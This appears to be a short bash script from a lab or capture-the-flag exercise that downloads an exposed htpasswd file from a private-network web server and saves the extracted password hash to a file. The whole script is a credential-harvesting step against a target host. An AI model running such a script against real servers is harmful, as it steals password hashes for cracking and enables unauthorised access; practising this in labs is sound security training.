#!/usr/bin/env bash

URL_ROOT="${1:-http://10.13.248.102}"
URL="$URL_ROOT/whatever/htpasswd"
MD5_HASH=$(curl "$URL" 2>/dev/null | cut -d: -f2)

if [ -z "$MD5_HASH" ]; then
  echo "No password found"
  exit 1
fi

echo "$MD5_HASH" > hash.txt
